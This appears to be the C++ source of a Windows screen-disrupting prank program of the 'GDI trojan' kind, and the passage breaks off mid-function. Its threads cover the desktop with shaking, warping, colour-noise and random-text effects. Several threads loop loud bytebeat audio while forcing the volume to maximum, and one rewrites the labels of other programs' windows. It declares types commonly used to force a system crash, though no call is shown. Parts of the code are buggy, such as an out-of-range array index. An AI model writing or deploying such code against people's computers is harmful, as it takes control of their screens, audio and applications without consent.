#define NOMINMAX
#include <windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 
#include <cmath>
#include <tchar.h>
#include <algorithm>
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "Msimg32.lib")
#define UNICODE
#define _UNICODE
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
LPCSTR icon = IDI_APPLICATION;
int shakeIntensity = 1;
int warpIntensity = 3;

//Wave Pre-Config
int waveDelay = rand() % 30;

//Random Thing Pre-Config
bool random = true;

//Random colors Pre-Config
int colorsdelay = 50;

namespace System
{
	VOID RedrawScreen(VOID)
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}
	BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
	{
		const WCHAR* labelText = L"" + rand() % 512;

		if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE) 
		{
			SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
		}

		return true;
	}
}



typedef struct IUnknown IUnknown;

#pragma once

#define PI 3.14159265358979

typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

namespace Math
{
	//A = amplitude
	//B = frequency
	//C = phase displacement
	//D = period
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * PI * b * c / d);
	}
}

namespace _3D
{
	VOID RotateX(VERTEX* vtx, float angle)
	{
		vtx->y = cos(angle) * vtx->y - sin(angle) * vtx->z;
		vtx->z = sin(angle) * vtx->y + cos(angle) * vtx->z;
	}

	VOID RotateY(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x + sin(angle) * vtx->z;
		vtx->z = -sin(angle) * vtx->x + cos(angle) * vtx->z;
	}

	VOID RotateZ(VERTEX* vtx, float angle)
	{
		vtx->x = cos(angle) * vtx->x - sin(angle) * vtx->y;
		vtx->y = sin(angle) * vtx->x + cos(angle) * vtx->y;
	}

	void DrawEdge(HDC dc, LPCWSTR icon, int x0, int y0, int x1, int y1, int r)
	{
		int dx = abs(x1 - x0);
		int dy = -abs(y1 - y0);

		int sx = (x0 < x1) ? 1 : -1;
		int sy = (y0 < y1) ? 1 : -1;

		int error = dx + dy;

		int i = 0;

		while (true)
		{
			if (i == 0)
			{
				DrawIcon(dc, x0, y0, LoadIcon(NULL, IDI_APPLICATION));
				i = 10;
			}
			else
			{
				i--;
			}

			if (x0 == x1 && y0 == y1)
			{
				break;
			}

			int e2 = 2 * error;

			if (e2 >= dy)
			{
				if (x0 == x1)
				{
					break;
				}

				error += dy;
				x0 += sx;
			}

			if (e2 <= dx)
			{
				if (y0 == y1)
				{
					break;
				}

				error += dx;
				y0 += sy;
			}
		}
	}
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace Colors
{
	RGBQUAD HSVtoRGB(HSV hsv)
	{
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

		switch (hi) 
		{
			case 0:
				return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
			case 1:
				return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
			case 2:
				return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
			case 3:
				return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
			case 4:
				return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
			default:
				return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad)
	{
		HSV hsv;

		double rd = rgbquad.rgbRed   / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue  / 255.0;

		double cmax = std::max(std::max(rd, gd), bd);
		double cmin = std::min(std::min(rd, gd), bd);
		double delta = cmax - cmin;

		hsv.v = cmax;

		if (cmax > 0.0)
			hsv.s = delta / cmax;
		else
			hsv.s = 0.0;

		if (delta > 0.0)
		{
			if (cmax == rd)
				hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd)
				hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd)
				hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

			if (hsv.h < 0.0)
				hsv.h += 360.0;
		}
		else
		{
			hsv.h = 0.0;
		}

		return hsv;
	}
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
	
DWORD WINAPI texts(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		LOGFONTW lFont = { 0 };

		//Setup our font style
		lFont.lfWidth = 20;
		lFont.lfHeight = 50;
		lFont.lfOrientation = 400;
		lFont.lfWeight = 800;
		lFont.lfUnderline = TRUE;
		lFont.lfQuality = DRAFT_QUALITY;
		lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;


		while (true)
		{
			if (rand() % 25 == 24)
			{
				LPCSTR lpStrings[] =
				{
					"idk", "Cyano", "NIKUSA!",
					"lolplayer.php", "fuck da dc ops", "idc",
					"x0r", "wowlol", "really?", "BIRB",
					"COROSIVE METAL", "Paper", ">:3", "PLASMO", "CyanTube",
					"is this bro a bro?", "UFFER", "RSC96 IS UNDERAGE",
					"we", "MUSIC IS A THERAPY", "ilol",
					"SKIDDED", "minty", "pomboclatt", "LMAO", "cooked lol"
				};

				//Setup the angle
				lFont.lfEscapement = rand() % 60;

				HFONT hFont = CreateFontIndirectW(&lFont);
				SelectObject(dc, hFont);

				//Setup the colors
				SetTextColor(dc, RGB(rand() % 0xFF, rand() % 0xFF, rand() % 0xFF));
				SetBkColor(dc, RGB(rand() % 0xA0, rand() % 0xA0, rand() % 0xA0));

				int index = rand() % 40;

				TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

				if (rand() % 25 == 24)
				{
					if (rand() % 2 == 0)
					{
						BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x999999);
					}
					else
					{
						BitBlt(dc, 1, 0, w, h, dc, 0, 1, 0x666666);
					}
				}

				Sleep(rand() % 5);

				if (rand() % 25 == 24)
				{
					RedrawWindow(0, 0, 0, 133);
				}
			}
		}

		return 0x00;
	}
	DWORD WINAPI alpha(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];
		
		DWORD c = 0;
		DWORD e = 0;
		
		FLOAT volume = 0.0;
		FLOAT dx = 0.6;
		
		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == 35000)
				{
					c = 0;
					e++;

					dx += 0.1;

					if (dx > 0.7) dx = 0.5;

					if (e % 10 && volume != 3)
					{
						volume += 0.1;
					}
				}

				DWORD d = c * dx;

				DWORD freq = d % 30;
			
				DWORD sound = c & freq % 500;

				sbuffer[t] = sound * volume;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}
	DWORD WINAPI messlabels(LPVOID lpvd)
	{
		while (true)
		{
			HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
			EnumChildWindows(hwnd, System::EnumChildProc, NULL);
		}
	}
	DWORD WINAPI beta(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{

				DWORD d = (t & 1) * 4;

				DWORD freq = (d | d << 2) >> 100;

				DWORD sound = t | (freq | t) % 500;

				sbuffer[t] = sound * 0.5;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}

	DWORD WINAPI waves(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);

		int i = 0;

		while (true)
		{
			int waveAmplitude = rand() % 3;
			int wavePhase = rand() % 20;

			if (rand() % 25 == 0)
			{
				for (int y = 0; y < h; y++)
				{
					int zx = Math::SineWave(waveAmplitude, y + i * 4, wavePhase, h);

					BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);
				}

				Sleep(1);

				if (rand() % 25 == 0) System::RedrawScreen();

				i++;
			}
		}

		return 0x00;
	}
DWORD WINAPI shake1(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		/*
			Intensity:
			1  - WEAK
			10 - HARD
		*/

		while (1)
		{
			for (int i = 1; i <= shakeIntensity; i++)
			{
				StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
				StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
			}

			/*
				+Intensity, +Fast
				-Intensity, -Fast
			*/

			if (shakeIntensity < 10)
			{
				Sleep(rand() % 25);
			}
			else
			{
				Sleep(rand() % 5);
			}

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}
	DWORD WINAPI shakeinlol(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		/*
			Intensity:
			1  - WEAK
			10 - HARD
		*/

		while (1)
		{
			for (int i = 10; i <= shakeIntensity; i++)
			{
				StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
				StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
			}

			/*
				+Intensity, +Fast
				-Intensity, -Fast
			*/

			if (shakeIntensity < 10)
			{
				Sleep(rand() % 25);
			}
			else
			{
				Sleep(rand() % 5);
			}

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}
DWORD WINAPI bit(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		int color = 0;

		bool statementA = true;
		bool statementB = true;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			int r = rand() % 0xFF;
			int g = rand() % 0xFF;
			int b = rand() % 0xFF;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int noise = rand() % 0xFF;

					noise %= (r * g * b + 1) % (color + 1) + 1;

					rgbquad[index].rgbRed   += noise + r;
					rgbquad[index].rgbGreen += noise + g;
					rgbquad[index].rgbBlue  += noise + b;
				}
			}

			if (statementA)
			{
				color++;

				if (color > 0xAA)
				{
					statementA = false;
					statementB = true;
				}
			}

			if (statementB)
			{
				color--;

				if (color == 0)
				{
					statementA = true;
					statementB = false;
				}
			}

			Sleep(rand() % 500);

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(50);
			System::RedrawScreen();
		}

		return 0x00;
	}
    
	DWORD WINAPI gamma(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD freq = Math::SineWave(10, t % 1000, 1, 1000);

				sbuffer[t] = t ^ (freq % 5);
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}
	
		DWORD WINAPI ithinkthisisthecube(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		/*
			   Setup the Tesseract's size
			By your screen's width and height
		*/

		float size = (w + h) / 10;

		int cx = size;
		int cy = size;

		int xdv = 10;
		int ydv = 10;

		float angleX = 0.01;
		float angleY = 0.01;
		float angleZ = 0.01;

		int d = 60;

		VERTEX vtx[] =
		{
			//BOTTOM HYPER CUBE
			{size, 0, 0},
			{size, size, 0},
			{0, size, 0},
			{0, 0, 0},

			//TOP HYPER CUBE
			{size, 0, size},
			{size, size, size},
			{0, size, size},
			{0, 0, size},

			//BOTTOM INSIDE HYPER CUBE
			{size - d,  d,      d},
			{size - d,  size - d,  d},
			{d,      size - d,  d},
			{d,      d,      d},

			//TOP INSIDE HYPER CUBE
			{size - d,  d,      size - d},
			{size - d,  size - d,  size - d},
			{d,      size - d,  size - d},
			{d,      d,      size - d}
		};

		//32 EDGES
		EDGE edges[] =
		{
			//BOTTOM HYPER CUBE FACE (0, 1, 2, 3)
			{0, 1},
			{1, 2},
			{2, 3},
			{3, 0},

			//BOTTOM-TOP HYPER CUBE FACE
			{0, 4},
			{1, 5},
			{2, 6},
			{3, 7},

			//TOP HYPER CUBE FACE (4, 5, 6, 7)
			{4, 5},
			{5, 6},
			{6, 7},
			{7, 4},

			//BOTTOM INSIDE HYPER CUBE FACE (8, 9, 10, 11)
			{8,   9},
			{9,  10},
			{10, 11},
			{11,  8},

			//BOTTOM-TOP INSIDE HYPER CUBE FACE
			{8,  12},
			{9,  13},
			{10, 14},
			{11, 15},

			//TOP INSIDE HYPER CUBE FACE (12, 13, 14, 15)
			{12, 13},
			{13, 14},
			{14, 15},
			{15, 12},

			//HYPER CUBE AND INSIDE CONNECTION BOTTOM
			{0,  8},
			{1,  9},
			{2, 10},
			{3, 11},

			//HYPER CUBE AND INSIDE CONNECTION TOP
			{4, 12},
			{5, 13},
			{6, 14},
			{7, 15}
		};

LPCWSTR icons[] = {
    L"L",
    L"M",
    L"A",
    L"O"
};

		int index = rand() % 4;

		//Calculate the number of vertex and edges
		int totvtx = sizeof(vtx) / sizeof(vtx[0]);
		int totedg = sizeof(edges) / sizeof(edges[0]);

		while (true)
		{
			//Rotate Axis
			for (int i = 0; i < totvtx; i++)
			{
				_3D::RotateX(&vtx[i], angleX);
				_3D::RotateY(&vtx[i], angleY);
				_3D::RotateZ(&vtx[i], angleZ);
			}

			//Draw the edge
			for (int i = 0; i < totedg; i++)
			{
				_3D::DrawEdge(dc, icons[index],
							  vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy, 
					          vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy, 20);
			}

			Sleep(40);
			if (rand() % 5 == 0) System::RedrawScreen();

			//Moves the tesseract around
			cx += xdv;
			cy += ydv;

			//Right and left collisions
			if (cx > w - (size / 2) || cx < -(size / 2))
			{
				xdv *= -1;
				index = rand() % 4;
			}

			//Top and bottom collisions
			if (cy > h - (size / 2) || cy < -(size / 2))
			{
				ydv *= -1;
				index = rand() % 4;
			}
		}

		return 0x00;
	}
	DWORD WINAPI A(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD wave = Math::SineWave(1, t, 1, wfx.nSamplesPerSec);

				DWORD freq = ((wave | t) * 967);

				sbuffer[t] = t | (freq | t) % 500;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}
	DWORD WINAPI B(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;
		FLOAT d = 4.9;
		DWORD e = 0;

		BOOL statementA = TRUE; //4.9 -> 4.1
		BOOL statementB = FALSE; //3.2 -> 3.8
		BOOL statementC = FALSE; //3.8 -> 3.2

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				//d = 4.9
				if (statementA && c == 10000)
				{
					c = 0;
					d -= 0.1;

					if (d <= 3.8)
					{
						d = 3.4;
						e++;

						if (e == 3)
						{
							statementA = false;
							statementB = true;

							d = 3.2;
							e = 0;
						}
					}
				}

				//d = 3.2
				if (statementB && c == 10000)
				{
					c = 0;
					d += 0.1;

					if (d >= 3.5)
					{
						d = 3.1;
						e++;

						if (e == 3)
						{
							statementB = false;
							statementC = true;

							d = 3.4;
							e = 0;
						}
					}
				}

				//d = 3.8
				if (statementC && c == 10000)
				{
					c = 0;
					d -= 0.1;

					if (d <= 3.1)
					{
						d = 3.9;
						e++;

						if (e == 2)
						{
							statementC = false;
							statementA = true;

							d = 4.9;
							e = 0;
						}
					}
				}

				int dx = c * d;
				int freq = dx % 467;

				double sound = c | freq % 100000;

				sbuffer[t] = sound;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}
	DWORD WINAPI kaleidoscope(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		DWORD rop = SRCCOPY;

		bool statementA = true;
		bool statementB = false;

		int scrollX, scrollY;

		int cw = w / 2;
		int ch = h / 2;

		int limit = 25;

		int i = 0;

		while (1)
		{
			//Put right on left and reflect it with lateral shift
			StretchBlt(dcCopy, 0, 0, w, h, dc, w, 0, -cw, h, rop);
			StretchBlt(dc, 0, 0, cw, h, dcCopy, 0, 0, w, h, rop);
			
			System::RedrawScreen();

			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, rop);

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					int dx = 10;

					//First scroll
					if (statementA)
					{
						scrollX = (x + dx) % w;
						scrollY = (y + dx) % h;
					}

					//Second scroll
					else if (statementB)
					{
						scrollX = (x + dx) % w;
						scrollY = abs(y - dx) % h;
					}

					int srcIndex = scrollY * w + scrollX;

					rgbquad[index] = rgbquad[srcIndex];
				}
			}

			if (statementA)
			{
				i++;

				if (i > limit)
				{
					statementA = false;
					statementB = true;

					System::RedrawScreen();
				}
			}

			else if (statementB)
			{
				i--;

				if (i < 0)
				{
					statementA = true;
					statementB = true;

					System::RedrawScreen();
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, rop);

			//Put top on bottom and reflect it with lateral shift
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, ch, rop);
			StretchBlt(dc, 0, ch, w, ch, dcCopy, 0, h, w, -h, rop);

			Sleep(20);
		}

		return 0x00;
	}
	DWORD WINAPI noise(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 }; // ?????????? 44100 ?? ??? ??????? ????????

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				// ???????? ???????? ??????? ??? ?????? ???????
				DWORD freq = (rand() % 2 == 0) ? (rand() % 50 + 1) : (rand() % 200 + 50); // ?????? (1-50) ??? ??????? (50-250)

				// ????????? ???????? ? sbuffer ? ?????? ???????
				sbuffer[t] = (BYTE)((c + freq) % 256); // ???????? ???????? ? ??????????? ?? ???????

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * (rand() % 3 + 1)); // ????????? ???????? ?? 1 ?? 3 ??????
		}

		waveOutClose(hWaveOut); // ????????? ?????????? ????? ?????????? ??????
		return 0x00;
	}
	DWORD WINAPI C(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD c = t * 4;

				DWORD freq = (c | c << 3) >> 97;

				sbuffer[t] = t | (freq | t) % 560;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}
	DWORD WINAPI center(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 32;

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = x - (ws / 2);
					int cy = y - (hs / 2);

					int zx = (cx * cx);
					int zy = (cy * cy);

					int di = 128.0 + i;

					int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

					HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

					hsv.h = fmod(fx + i, 360.0);

					rgbquad[index] = Colors::HSVtoRGB(hsv);
				}
			}

			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 1000);
			System::RedrawScreen();
		}

		return 0x00;
	}
	DWORD WINAPI strips(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP hbmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, hbmp);

		INT x = 0; INT y = 0;

		while (true)
		{
			DWORD rop = SRCPAINT;

			int dx0 = rand() % 20;
			int dx1 = x;

			int dy0 = y;
			int dy1 = rand() % 20;

			int size = 20;

			//Y DISPLACEMENT
			if (rand() % 2 == 0) BitBlt(dc, -dx0, dy0, w, size, dc, dx0, dy0, rop);
			if (rand() % 2 == 0) BitBlt(dc, dx0, dy0, w, size, dc, -dx0, dy0, rop);

			//X DISPLACEMENT
			if (rand() % 2 == 0) BitBlt(dc, dx1, dy1, size, h, dc, dx1, -dy1, rop);
			if (rand() % 2 == 0) BitBlt(dc, dx1, -dy1, size, h, dc, dx1, dy1, rop);

			x += size;
			y += size;

			if (x > w)
			{
				x = 0;

				Sleep(25);
				if (rand() % 5 == 0) System::RedrawScreen();
			}
			if (y > h)
			{
				y = 0;
			}
		}

		return 0x00;
	}
DWORD WINAPI snd2(LPVOID lpvd)
	{
		DWORD counter = 44000;
		DWORD d = 0;
		DWORD c = 0;

		BOOL statement = TRUE;

		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == counter)
				{
					if (statement)
					{
						d++;

						if (d == 11)
						{
							statement = FALSE;
						}
					}

					if (!statement)
					{
						d--;

						if (d == 0)
						{
							statement = TRUE;
						}
					}

					if (counter == 469) d = rand() % 10;

					if (counter > 1000) counter -= 1000;
					if (counter <= 1000) counter -= 50;

					if (counter == 0) counter = 500;

					c = 0;
				}

				int freq = c * (3 + ((float)d / (float)10));
				sbuffer[t] = t | freq % 478;

				c++;
			}

